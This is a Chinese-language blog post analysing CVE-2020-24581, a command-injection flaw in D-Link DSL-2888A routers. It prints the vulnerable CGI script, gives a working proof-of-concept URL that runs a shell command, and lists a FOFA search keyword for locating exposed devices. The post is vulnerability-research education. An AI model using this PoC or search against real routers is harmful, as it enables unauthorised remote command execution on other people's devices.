<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CVE-2020-24581 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CVE-2020-24581</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-09T11:51:32.000Z" id="date"> 2023-08-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-09T14:05:52.441Z" id="updated"> 2023-08-09</time></div></span><br><span>Word Count: <div class="control">1.2k</div></span><br><span>Read Time: <div class="control">5 min</div></span></div></div><hr><div id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参照资料<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229323#h3-5">https://www.anquanke.com/post/id/229323#h3-5</a></p>
<p>比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我</p>
<p>同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误</p>
<p><strong>漏洞路由器型号:D-Link DSL-2888A</strong></p>
<p><strong>漏洞编号: CVE-2020-24581</strong></p>
<p><strong>fofa搜索关键词: body&#x3D;DSL-2888A</strong></p>
<p><strong>漏洞影响版本:  AU_2.31_V1.1.47ae55之前的版本</strong></p>
<p><strong>固件下载: <a target="_blank" rel="noopener" href="https://www.dlink.com.sg/dsl-2888a/">https://www.dlink.com.sg/dsl-2888a/</a></strong></p>
<h1 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h1><p>首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行</p>
<p>为了捋清楚漏洞的本质 我们要定位到以下两个重点</p>
<p><strong>1.如何执行到execute_cmd.cgi文件</strong></p>
<p><strong>2.如何赋值execute_cmd.cgi的参数</strong></p>
<h2 id="如何执行到execute-cmd-cgi文件"><a href="#如何执行到execute-cmd-cgi文件" class="headerlink" title="如何执行到execute_cmd.cgi文件"></a>如何执行到execute_cmd.cgi文件</h2><p>&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本</p>
<p>本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if [ -e &quot;/usr/sbin/onetouch&quot; ]; then</span><br><span class="line">dxml -n dbros -t &amp;</span><br><span class="line">sleep 1</span><br><span class="line">dxmlc -l /usr/script/onetouch/dlink.xml</span><br><span class="line">sleep 1</span><br><span class="line">/usr/script/onetouch/sync_device.sh</span><br><span class="line">/usr/script/onetouch/sync_wan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan5g.sh</span><br><span class="line"></span><br><span class="line">dhttpd &amp;</span><br><span class="line">killall onetouch</span><br><span class="line">onetouch &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" alt="image.png"><br>发现是32位的ARM架构的文件<br>随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数<br>先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本<br>其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下<br>所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数<br>该函数用来加载web和cgi组件<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" alt="image.png"><br>我们可以进一步跟进到sub_BEA0函数<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" alt="image.png"><br>这里进行调用cgi文件前的相关check和初始化<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" alt="image.png"><br>在后面可以看到 需要相关的环境变量来启动cgi文件<br>可以看到有REMOTE_USER的变量 说明可能需要<br>随后调用了sub_BB5C函数执行cgi文件</p>
<h2 id="如何赋值execute-cmd-cgi的参数"><a href="#如何赋值execute-cmd-cgi的参数" class="headerlink" title="如何赋值execute_cmd.cgi的参数"></a>如何赋值execute_cmd.cgi的参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /usr/syscfg/api_log.sh</span><br><span class="line">cmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` </span><br><span class="line">cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` </span><br><span class="line">result=`$&#123;cmd&#125;`  </span><br><span class="line">TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;</span><br><span class="line">echo  &quot;Content-type: text/html&quot;</span><br><span class="line">echo  &quot;&quot;</span><br><span class="line">echo -n $&#123;result&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’<br>那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_files</span>(<span class="params">directory, target_string</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                line_number = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">if</span> target_string.lower() <span class="keyword">in</span> line.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found in file: <span class="subst">&#123;filepath&#125;</span>, line: <span class="subst">&#123;line_number&#125;</span>, content: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                    line_number += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要搜索的目录和目标字符串</span></span><br><span class="line">search_directory = <span class="string">&#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;</span></span><br><span class="line">target_string = <span class="string">&#x27;QUERYSTRING&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行批量搜索</span></span><br><span class="line">search_files(search_directory, target_string)</span><br></pre></td></tr></table></figure>

<p>这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" alt="image-20230809214437721"></p>
<p>于是我们可以定位到ajax.js文件</p>
<p>通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get <span class="punctuation">:</span> function(_dataType)</span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		var _url = this.url;</span><br><span class="line">		if(_url.indexOf(&#x27;?&#x27;) == <span class="number">-1</span>)</span><br><span class="line">			_url += &#x27;?timestamp=&#x27; + new Date().getTime();</span><br><span class="line">		else</span><br><span class="line">			_url += <span class="string">&quot;&amp;timestamp=&quot;</span> + new Date().getTime();</span><br><span class="line">		if(this.queryString.length &gt; <span class="number">0</span>)</span><br><span class="line">			_url += <span class="string">&quot;&amp;&quot;</span> + this.queryString;</span><br><span class="line"></span><br><span class="line">		this.xmlHttp.open(<span class="string">&quot;GET&quot;</span><span class="punctuation">,</span> _url<span class="punctuation">,</span> <span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">		<span class="comment">/* will make IE11 fail.</span></span><br><span class="line"><span class="comment">		if(!document.all)&#123;</span></span><br><span class="line"><span class="comment">			if(_dataType == &quot;xml&quot;)</span></span><br><span class="line"><span class="comment">				this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);</span></span><br><span class="line"><span class="comment">			else</span></span><br><span class="line"><span class="comment">				this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  </span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		this.xmlHttp.send(<span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送</p>
<p>我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" alt="image-20230809215418504"></p>
<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证</p>
<p>所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞</p>
<p>这里就不进行讲解</p>
<p><a target="_blank" rel="noopener" href="https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/">https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/">← Next ToToLink-X5000R登录绕过</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/">qemu搭建路由器虚拟环境 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307062245113.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">逻辑分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%88%B0execute-cmd-cgi%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">如何执行到execute_cmd.cgi文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B5%8B%E5%80%BCexecute-cmd-cgi%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">如何赋值execute_cmd.cgi的参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">注意点</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>